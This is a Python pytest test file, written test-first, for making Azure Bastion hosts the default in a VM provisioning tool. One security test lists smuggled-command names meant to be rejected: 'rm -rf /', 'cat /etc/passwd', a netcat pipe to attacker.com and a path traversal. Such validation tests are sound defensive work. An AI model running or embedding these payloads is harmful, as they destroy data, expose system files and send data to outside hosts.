"""Unit tests for Bastion default behavior (TDD - Issue #237).

This test suite defines the expected behavior for making bastion hosts
the default when creating VMs. These tests will FAIL until implementation
is complete.

Test Coverage:
- Bastion auto-detection in resource group
- User prompt for bastion creation
- VM provisioning with/without bastion
- Flag override behavior (--no-bastion)
- Backward compatibility with --use-bastion
- Error handling and edge cases

Testing Philosophy (Testing Pyramid):
- Unit tests: 60% coverage - Fast, isolated, focused
- Integration tests: 30% coverage - Module interactions
- E2E tests: 10% coverage - Complete workflows
"""

from pathlib import Path
from unittest.mock import patch

import pytest

from azlin.modules.bastion_config import BastionConfig
from azlin.modules.bastion_detector import BastionDetector, BastionDetectorError
from azlin.vm_provisioning import ProvisioningError, VMConfig, VMProvisioner


class TestBastionAutoDetection:
    """Test automatic bastion detection in resource group.

    Requirement: Auto-detect bastion in resource group when creating VM.
    """

    def test_detect_bastion_in_resource_group_found(self):
        """Test bastion is detected when present in resource group."""
        # Arrange
        resource_group = "my-rg"
        mock_bastions = [
            {
                "name": "my-bastion",
                "resourceGroup": "my-rg",
                "provisioningState": "Succeeded",
                "sku": {"name": "Standard"},
            }
        ]

        # Act
        with patch.object(BastionDetector, "list_bastions", return_value=mock_bastions):
            bastion = BastionDetector.detect_bastion_for_vm("test-vm", resource_group)

        # Assert
        assert bastion is not None
        assert bastion["name"] == "my-bastion"
        assert bastion["resource_group"] == resource_group

    def test_detect_bastion_in_resource_group_not_found(self):
        """Test no bastion detected when none exist in resource group."""
        # Arrange
        resource_group = "my-rg"

        # Act
        with patch.object(BastionDetector, "list_bastions", return_value=[]):
            bastion = BastionDetector.detect_bastion_for_vm("test-vm", resource_group)

        # Assert
        assert bastion is None

    def test_detect_bastion_multiple_hosts_uses_first(self):
        """Test first bastion is used when multiple exist."""
        # Arrange
        resource_group = "my-rg"
        mock_bastions = [
            {"name": "bastion-1", "provisioningState": "Succeeded"},
            {"name": "bastion-2", "provisioningState": "Succeeded"},
        ]

        # Act
        with patch.object(BastionDetector, "list_bastions", return_value=mock_bastions):
            bastion = BastionDetector.detect_bastion_for_vm("test-vm", resource_group)

        # Assert
        assert bastion["name"] == "bastion-1"

    def test_detect_bastion_ignores_failed_state(self):
        """Test failed bastion hosts are ignored."""
        # Arrange
        resource_group = "my-rg"
        mock_bastions = [{"name": "failed-bastion", "provisioningState": "Failed"}]

        # Act
        with patch.object(BastionDetector, "list_bastions", return_value=mock_bastions):
            # Should filter out failed bastions
            bastion = BastionDetector.detect_bastion_for_vm("test-vm", resource_group)

        # Assert
        assert bastion is None or bastion["name"] != "failed-bastion"

    def test_detect_bastion_handles_azure_errors_gracefully(self):
        """Test azure errors during detection are handled gracefully."""
        # Arrange
        resource_group = "my-rg"

        # Act
        with patch.object(
            BastionDetector, "list_bastions", side_effect=BastionDetectorError("Network error")
        ):
            bastion = BastionDetector.detect_bastion_for_vm("test-vm", resource_group)

        # Assert - Should return None, not raise
        assert bastion is None


class TestUserPromptBehavior:
    """Test user interaction prompts for bastion usage.

    Requirement: Prompt user to create bastion if doesn't exist (default: yes).
    """

    def test_prompt_use_existing_bastion_user_accepts(self):
        """Test user accepts using existing bastion."""
        # Arrange
        bastion_info = {"name": "my-bastion", "resource_group": "my-rg"}

        # Act
        with patch("click.confirm", return_value=True) as mock_confirm:
            result = mock_confirm(
                f"Found Bastion host '{bastion_info['name']}'. Use it for this VM?", default=True
            )

        # Assert
        assert result is True
        mock_confirm.assert_called_once()

    def test_prompt_use_existing_bastion_user_declines(self):
        """Test user declines using existing bastion."""
        # Arrange
        bastion_info = {"name": "my-bastion", "resource_group": "my-rg"}

        # Act
        with patch("click.confirm", return_value=False) as mock_confirm:
            result = mock_confirm(
                f"Found Bastion host '{bastion_info['name']}'. Use it for this VM?", default=True
            )

        # Assert
        assert result is False

    def test_prompt_create_bastion_default_yes(self):
        """Test prompt to create bastion defaults to yes."""
        # Arrange - No bastion exists

        # Act
        with patch("click.confirm", return_value=True) as mock_confirm:
            result = mock_confirm(
                "No Bastion host found. Create one for secure access?", default=True
            )

        # Assert
        assert result is True

    def test_prompt_create_bastion_user_declines(self):
        """Test user declines creating bastion."""
        # Arrange

        # Act
        with patch("click.confirm", return_value=False) as mock_confirm:
            result = mock_confirm(
                "No Bastion host found. Create one for secure access?", default=True
            )

        # Assert
        assert result is False

    def test_prompt_includes_cost_information(self):
        """Test prompt includes cost information for bastion."""
        # Arrange
        expected_message = (
            "No Bastion host found. Create one for secure access?\n"
            "Note: Azure Bastion costs ~$140/month for Standard SKU"
        )

        # Act
        with patch("click.confirm") as mock_confirm:
            mock_confirm(expected_message, default=True)

        # Assert
        mock_confirm.assert_called_once_with(expected_message, default=True)


class TestVMProvisioningWithBastion:
    """Test VM provisioning behavior with bastion hosts.

    Requirement: VM provisioning should automatically use bastion when available.
    """

    def test_provision_vm_with_bastion_no_public_ip(self):
        """Test VM provisioned with bastion gets no public IP."""
        # Arrange
        config = VMConfig(
            name="test-vm", resource_group="my-rg", location="westus2", use_bastion=True
        )

        # Act
        with patch("subprocess.run") as mock_run:
            mock_run.return_value.stdout = '{"privateIpAddress": "10.0.0.4"}'
            # Should NOT include --public-ip-address in command

        # Assert
        # Implementation should check that public IP flag is omitted
        pass

    def test_provision_vm_without_bastion_has_public_ip(self):
        """Test VM provisioned without bastion gets public IP."""
        # Arrange
        config = VMConfig(
            name="test-vm", resource_group="my-rg", location="westus2", use_bastion=False
        )

        # Act - Should include public IP in provisioning

        # Assert
        # Implementation should verify public IP is created
        pass

    def test_provision_vm_bastion_auto_detect_success(self):
        """Test VM provisioning auto-detects and uses bastion."""
        # Arrange
        provisioner = VMProvisioner()
        config = VMConfig(name="test-vm", resource_group="my-rg", location="westus2")
        bastion_info = {"name": "my-bastion", "resource_group": "my-rg"}

        # Act
        with patch.object(BastionDetector, "detect_bastion_for_vm", return_value=bastion_info):
            with patch("click.confirm", return_value=True):
                # Should use bastion automatically
                pass

        # Assert
        # Verify bastion was detected and user was prompted
        pass

    def test_provision_vm_no_bastion_prompt_to_create(self):
        """Test provisioning prompts to create bastion when none exists."""
        # Arrange
        provisioner = VMProvisioner()
        config = VMConfig(name="test-vm", resource_group="my-rg", location="westus2")

        # Act
        with patch.object(BastionDetector, "detect_bastion_for_vm", return_value=None):
            with patch("click.confirm", return_value=True) as mock_confirm:
                # Should prompt to create bastion
                pass

        # Assert
        # Verify user was prompted to create bastion
        pass

    def test_provision_vm_user_declines_bastion_uses_public_ip(self):
        """Test VM gets public IP when user declines bastion."""
        # Arrange
        provisioner = VMProvisioner()
        config = VMConfig(name="test-vm", resource_group="my-rg", location="westus2")

        # Act
        with patch.object(BastionDetector, "detect_bastion_for_vm", return_value=None):
            with patch("click.confirm", return_value=False):
                # Should provision with public IP
                pass

        # Assert
        # Verify public IP was created
        pass


class TestBastionFlagOverride:
    """Test --no-bastion flag behavior.

    Requirement: Allow user to decline and create public IP instead.
    """

    def test_no_bastion_flag_skips_detection(self):
        """Test --no-bastion flag skips auto-detection."""
        # Arrange
        config = VMConfig(
            name="test-vm", resource_group="my-rg", location="westus2", no_bastion=True
        )

        # Act
        with patch.object(BastionDetector, "detect_bastion_for_vm") as mock_detect:
            # Should NOT call detect when no_bastion=True
            pass

        # Assert
        mock_detect.assert_not_called()

    def test_no_bastion_flag_forces_public_ip(self):
        """Test --no-bastion flag forces public IP creation."""
        # Arrange
        config = VMConfig(
            name="test-vm", resource_group="my-rg", location="westus2", no_bastion=True
        )
        bastion_exists = {"name": "my-bastion", "resource_group": "my-rg"}

        # Act
        with patch.object(BastionDetector, "detect_bastion_for_vm", return_value=bastion_exists):
            # Should create public IP even though bastion exists
            pass

        # Assert
        # Verify public IP was created despite bastion availability
        pass

    def test_no_bastion_flag_no_user_prompt(self):
        """Test --no-bastion flag skips user prompts."""
        # Arrange
        config = VMConfig(
            name="test-vm", resource_group="my-rg", location="westus2", no_bastion=True
        )

        # Act
        with patch("click.confirm") as mock_confirm:
            # Should NOT prompt user when no_bastion=True
            pass

        # Assert
        mock_confirm.assert_not_called()


class TestBackwardCompatibility:
    """Test backward compatibility with existing --use-bastion flag.

    Requirement: Existing --use-bastion flag should still work.
    """

    def test_use_bastion_flag_forces_bastion_usage(self):
        """Test --use-bastion flag forces bastion usage."""
        # Arrange
        config = VMConfig(
            name="test-vm", resource_group="my-rg", location="westus2", use_bastion=True
        )

        # Act - Should use bastion without prompting
        with patch("click.confirm") as mock_confirm:
            # Should NOT prompt when use_bastion=True (explicit)
            pass

        # Assert
        mock_confirm.assert_not_called()

    def test_use_bastion_flag_requires_bastion_name(self):
        """Test --use-bastion flag requires bastion name if not auto-detected."""
        # Arrange
        config = VMConfig(
            name="test-vm", resource_group="my-rg", location="westus2", use_bastion=True
        )

        # Act
        with patch.object(BastionDetector, "detect_bastion_for_vm", return_value=None):
            # Should raise error if no bastion name provided and none detected
            with pytest.raises(ProvisioningError, match="Bastion name required"):
                pass

    def test_use_bastion_flag_with_bastion_name(self):
        """Test --use-bastion with explicit bastion name."""
        # Arrange
        config = VMConfig(
            name="test-vm",
            resource_group="my-rg",
            location="westus2",
            use_bastion=True,
            bastion_name="my-bastion",
            bastion_resource_group="network-rg",
        )

        # Act - Should use specified bastion

        # Assert
        # Verify correct bastion was used
        pass

    def test_use_bastion_and_no_bastion_conflict(self):
        """Test conflicting flags --use-bastion and --no-bastion."""
        # Arrange - Both flags provided

        # Act & Assert
        with pytest.raises(ValueError, match="Cannot specify both.*use-bastion.*no-bastion"):
            config = VMConfig(
                name="test-vm", resource_group="my-rg", use_bastion=True, no_bastion=True
            )


class TestConnectionFlowWithBastion:
    """Test connection flow when bastion is used.

    Requirement: Connection flow should automatically use bastion.
    """

    def test_connect_to_vm_auto_uses_bastion(self):
        """Test connecting to VM automatically uses bastion when available."""
        # Arrange
        vm_name = "test-vm"
        resource_group = "my-rg"
        bastion_info = {"name": "my-bastion", "resource_group": "my-rg"}

        # Act
        with patch.object(BastionDetector, "detect_bastion_for_vm", return_value=bastion_info):
            with patch("click.confirm", return_value=True):
                # Should create bastion tunnel automatically
                pass

        # Assert
        # Verify bastion tunnel was created
        pass

    def test_connect_to_vm_with_public_ip_prefers_direct(self):
        """Test connecting to VM with public IP uses direct connection."""
        # Arrange
        vm_name = "test-vm"
        vm_has_public_ip = True
        bastion_exists = {"name": "my-bastion", "resource_group": "my-rg"}

        # Act - Should prefer direct connection over bastion for performance

        # Assert
        # Verify direct connection was used, not bastion
        pass

    def test_connect_to_private_vm_requires_bastion(self):
        """Test connecting to private-only VM requires bastion."""
        # Arrange
        vm_name = "test-vm"
        vm_has_public_ip = False
        bastion_exists = None

        # Act & Assert
        with pytest.raises(ProvisioningError, match="No bastion available.*private VM"):
            # Should fail if no bastion and no public IP
            pass


class TestErrorHandling:
    """Test error handling and edge cases.

    Requirement: Test error scenarios and edge cases.
    """

    def test_bastion_detection_timeout(self):
        """Test bastion detection handles timeout gracefully."""
        # Arrange
        resource_group = "my-rg"

        # Act
        with patch.object(
            BastionDetector, "list_bastions", side_effect=TimeoutError("Operation timed out")
        ):
            bastion = BastionDetector.detect_bastion_for_vm("test-vm", resource_group)

        # Assert - Should return None, not crash
        assert bastion is None

    def test_bastion_creation_fails_fallback_to_public_ip(self):
        """Test falling back to public IP if bastion creation fails."""
        # Arrange
        user_requested_bastion = True
        bastion_creation_failed = True

        # Act - Should prompt user to continue with public IP
        with patch("click.confirm", return_value=True) as mock_confirm:
            # Should ask: "Bastion creation failed. Create VM with public IP instead?"
            pass

        # Assert
        # Verify fallback prompt was shown
        pass

    def test_invalid_bastion_name_validation(self):
        """Test validation of bastion names."""
        # Arrange
        invalid_names = [
            "",  # Empty
            "a" * 100,  # Too long
            "bastion@name",  # Invalid characters
            "bastion name",  # Spaces
        ]

        # Act & Assert
        for invalid_name in invalid_names:
            with pytest.raises(ValueError, match="Invalid bastion name"):
                config = VMConfig(name="test-vm", resource_group="my-rg", bastion_name=invalid_name)

    def test_bastion_in_different_vnet_warning(self):
        """Test warning when bastion is in different VNet."""
        # Arrange
        vm_vnet = "vnet-a"
        bastion_vnet = "vnet-b"

        # Act - Should warn user about VNet mismatch
        with patch("logging.warning") as mock_warn:
            # Should log warning about VNet mismatch
            pass

        # Assert
        # Verify warning was logged
        pass

    def test_bastion_subnet_misconfiguration_error(self):
        """Test error when bastion subnet is misconfigured."""
        # Arrange
        bastion_subnet_wrong_name = "default"  # Should be "AzureBastionSubnet"

        # Act & Assert
        with pytest.raises(
            ProvisioningError, match="Bastion subnet must be named 'AzureBastionSubnet'"
        ):
            # Should validate subnet name
            pass


class TestBastionConfigPersistence:
    """Test bastion configuration storage and retrieval.

    Requirement: Store user preferences for bastion usage.
    """

    def test_save_bastion_preference_for_vm(self):
        """Test saving user's bastion preference for specific VM."""
        # Arrange
        config = BastionConfig()

        # Act
        config.add_mapping(
            vm_name="test-vm",
            vm_resource_group="my-rg",
            bastion_name="my-bastion",
            bastion_resource_group="network-rg",
        )

        # Assert
        mapping = config.get_mapping("test-vm")
        assert mapping is not None
        assert mapping.bastion_name == "my-bastion"

    def test_load_bastion_preference_on_next_connection(self):
        """Test loading saved bastion preference."""
        # Arrange
        config = BastionConfig()
        config.add_mapping(
            vm_name="test-vm",
            vm_resource_group="my-rg",
            bastion_name="my-bastion",
            bastion_resource_group="network-rg",
        )

        # Act - Save and reload
        temp_path = Path("/tmp/test_bastion_config.toml")
        config.save(temp_path)
        loaded_config = BastionConfig.load(temp_path)

        # Assert
        mapping = loaded_config.get_mapping("test-vm")
        assert mapping is not None
        assert mapping.bastion_name == "my-bastion"

        # Cleanup
        temp_path.unlink(missing_ok=True)

    def test_prefer_bastion_global_setting(self):
        """Test global prefer_bastion setting."""
        # Arrange
        config = BastionConfig()
        config.prefer_bastion = True

        # Act - Should skip prompts and use bastion when available

        # Assert
        assert config.prefer_bastion is True


class TestSecurityRequirements:
    """Test security requirements for bastion default feature.

    Based on BASTION_SECURITY_REQUIREMENTS.md.
    """

    def test_no_bastion_credentials_stored(self):
        """Test no bastion credentials are stored in config (REQ-CONFIG-001)."""
        # Arrange
        config = BastionConfig()

        # Act
        config.add_mapping(
            vm_name="test-vm",
            vm_resource_group="my-rg",
            bastion_name="my-bastion",
            bastion_resource_group="network-rg",
        )

        # Assert
        config_dict = config.to_dict()
        # Verify no secret-like fields
        assert "password" not in str(config_dict).lower()
        assert "secret" not in str(config_dict).lower()
        assert "token" not in str(config_dict).lower()
        assert "key" not in str(config_dict).lower()

    def test_bastion_config_file_permissions(self):
        """Test config file has secure permissions (REQ-CONFIG-002)."""
        # Arrange
        config = BastionConfig()
        temp_path = Path("/tmp/test_bastion_secure.toml")

        # Act
        config.save(temp_path)

        # Assert
        stat = temp_path.stat()
        mode = stat.st_mode & 0o777
        assert mode == 0o600, f"Config file has insecure permissions: {oct(mode)}"

        # Cleanup
        temp_path.unlink(missing_ok=True)

    def test_bastion_name_validation_injection_prevention(self):
        """Test bastion name validation prevents injection (REQ-CONFIG-005)."""
        # Arrange
        malicious_names = [
            "bastion; rm -rf /",
            "bastion && cat /etc/passwd",
            "bastion | nc attacker.com 1234",
            "../../../etc/passwd",
        ]

        # Act & Assert
        for malicious_name in malicious_names:
            with pytest.raises(ValueError, match="Invalid.*name"):
                config = BastionConfig()
                config.add_mapping(
                    vm_name="test-vm",
                    vm_resource_group="my-rg",
                    bastion_name=malicious_name,
                    bastion_resource_group="my-rg",
                )


# Boundary condition tests
class TestBoundaryConditions:
    """Test boundary conditions and edge cases."""

    def test_empty_resource_group(self):
        """Test empty resource group name."""
        with pytest.raises(ValueError, match="Resource group.*empty"):
            config = VMConfig(name="test-vm", resource_group="")

    def test_very_long_vm_name(self):
        """Test VM name exceeding maximum length."""
        long_name = "a" * 100
        with pytest.raises(ValueError, match="Name too long"):
            config = VMConfig(name=long_name, resource_group="my-rg")

    def test_special_characters_in_names(self):
        """Test special characters are rejected."""
        invalid_names = ["vm@name", "vm name", "vm#name", "vm$name"]
        for invalid_name in invalid_names:
            with pytest.raises(ValueError, match="Invalid characters"):
                config = VMConfig(name=invalid_name, resource_group="my-rg")

    def test_null_bastion_info(self):
        """Test handling of null bastion info."""
        bastion = BastionDetector.detect_bastion_for_vm("test-vm", "my-rg")
        # Should not crash, return None
        assert bastion is None or isinstance(bastion, dict)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
